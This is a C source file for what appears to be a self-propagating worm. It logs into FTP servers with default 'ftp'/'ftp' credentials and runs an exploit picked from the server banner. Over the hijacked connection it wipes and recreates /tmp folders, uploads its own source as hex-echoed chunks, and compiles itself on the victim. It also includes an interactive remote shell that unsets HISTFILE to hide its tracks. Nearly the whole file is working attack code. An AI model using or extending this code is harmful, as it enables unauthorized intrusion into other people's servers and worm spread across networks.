#include <stdio.h>
#include <stdlib.h>
#include <stdarg.h>
#include <string.h>
#include <unistd.h>
#include <netinet/in.h>

#include "exploit.h"

#define INIT_CMD "unset HISTFILE;id;uname -a;\n"
#define MAX_COMMAND_SIZE 1024
#define FTP_USERNAME "ftp"
#define FTP_PASSWORD "ftp"

#define MAX(x, y) (((x) > (y)) ? (x) : (y))
#define MIN(x, y) (((x) < (y)) ? (x) : (y))

int run_ftp_exploit(char *hostname);
int propagate(int fd);
int upload_file(int fd, const char *filename, const char *dest);
int command(int fd, const char *str, ...);
int shell(int fd);

int main(int argc, char *argv[]) {
    char *hostname;
    int fd, ret;

    if (argc < 2) {
        fprintf(stderr, "Usage:\n\n\t%s TARGET_IP\n\n", argv[0]);
        exit(EXIT_FAILURE);
    }
    hostname = argv[1];

    printf("# Running FTP exploit...\n");
    fd = run_ftp_exploit(hostname);
    if (fd < 0) {
        fprintf(stderr, "Falha no exploit por FTP.\n");
        exit(EXIT_FAILURE);
    }

    printf("# Propagating worm...\n");
    ret = propagate(fd);
    if (ret < 0) {
        fprintf(stderr, "Falha ao propagar o worm.\n");
        exit(EXIT_FAILURE);
    }

    // ret = shell(fd);
    // if (ret < 0) {
    //     exit(EXIT_FAILURE);
    // }

    close(fd);
    exit(EXIT_SUCCESS);
}

int run_ftp_exploit(char *hostname) {
    int fd, ret;
    target_t *target = NULL;
    char *banner;

    fd = ftp_login(hostname, FTP_USERNAME, FTP_PASSWORD, &banner);
    if (fd <= 0) {
        fprintf(stderr, "Failed to connect (user/pass correct?)\n");
        return -1;
    }

    printf("# Banner: %s\n", (banner == NULL) ? "???" : banner);
    if (target == NULL) {
        target = target_from_banner(banner);
        if (target == NULL) {
            fprintf(stderr, "Failed to get target from banner, aborting...\n");
            return -1;
        }
    }
    printf ("# Target: %s\n", target->desc);

    ret = exploit(fd, target);
    if (ret != 0) {
        return -1;
    }

    return fd;
}

int propagate(int fd) {
    printf("# Cleaning up and preparing...\n");
    if (command(fd, "rm -rf /tmp/src /tmp/worm") < 0) {
        return -1;
    }
    if (command(fd, "mkdir -p /tmp/src") < 0) {
        return -1;
    }

    printf("# Uploading files...\n");
    if (upload_file(fd, "./main.c", "/tmp/src/main.c") < 0) {
        return -1;
    }
    if (upload_file(fd, "./exploit.c", "/tmp/src/exploit.c") < 0) {
        return -1;
    }
    if (upload_file(fd, "./exploit.h", "/tmp/src/exploit.h") < 0) {
        return -1;
    }

    printf("# Compiling...\n");
    if (command(fd, "gcc -o /tmp/worm /tmp/src/main.c /tmp/src/exploit.c") < 0) {
        return -1;
    }

    return 0;
}

int upload_file(int fd, const char *filename, const char *dest) {
    FILE *file;
    int size;
    unsigned char *file_buf;
    unsigned char hex_string[256];
    unsigned char hex[8];
    int i, offset;

    file = fopen(filename, "rb");

    if (file < 0) {
        fprintf(stderr, "Falha ao abrir arquivo '%s'.", filename);
        return -1;
    }

    // get the size of the file
    fseek(file, 0, SEEK_END);
    size = ftell(file);
    fseek(file, 0, SEEK_SET);

    // read the entire file into a buffer
    file_buf = (unsigned char*) malloc(size + 1);
    fread((void*) file_buf, size, 1, file);

    // push the file 16 bytes at a time
    for (i=0; i<size; i+=16) {
        // empty hex_string
        hex_string[0] = 0;

        // write hexadecimal bytes to hex_string
        for (offset=0; offset<MIN(16, size-i); offset++) {
            sprintf(hex, "\\x%02x", file_buf[i+offset]);
            strcat(hex_string, hex);
        }

        // execute a command to echo the hexadecimal bytes to the dest file
        if (command(fd, "(echo -n -e '%s' >> %s)", hex_string, dest) < 0) {
            free(file_buf);
            fclose(file);
            return -1;
        }
    }

    free(file_buf);
    fclose(file);
    return 0;
}

int command(int fd, const char *str, ...) {
    char buf[MAX_COMMAND_SIZE];
    va_list vl;

    va_start(vl, str);
    vsnprintf(buf, sizeof(buf), str, vl);
    va_end(vl);

    strcat(buf, " >>/tmp/log 2>&1 && echo ok || echo fail\n");
    write(fd, buf, strlen(buf));
    read(fd, buf, sizeof(buf));

    if (strncmp("ok", buf, 2) == 0) {
        return 0;
    }
    else {
        return -1;
    }
}

int shell(int fd) {
    char buf[MAX_COMMAND_SIZE];
    fd_set rfds;
    int len;

    write(fd, INIT_CMD, strlen(INIT_CMD));

    while (1) {
        FD_SET(0, &rfds);
        FD_SET(fd, &rfds);

        select(fd + 1, &rfds, NULL, NULL, NULL);
        if (FD_ISSET(0, &rfds)) {
            len = read(0, buf, sizeof(buf));
            if (len == 0) {
                // EOF on stdin
                return 0;
            }
            else if (len < 0) {
                fprintf(stderr, "Error reading from standard input.\n");
                return -1;
            }
            write(fd, buf, len);
        }

        if (FD_ISSET(fd, &rfds)) {
            len = read(fd, buf, sizeof(buf));
            if (len == 0) {
                printf("Connection closed by foreign host.\n");
                return -1;
            }
            else if (len < 0) {
                fprintf(stderr, "Error reading from foreign host.\n");
                return -1;
            }
            write(1, buf, len);
        }
    }

    return 0;
}
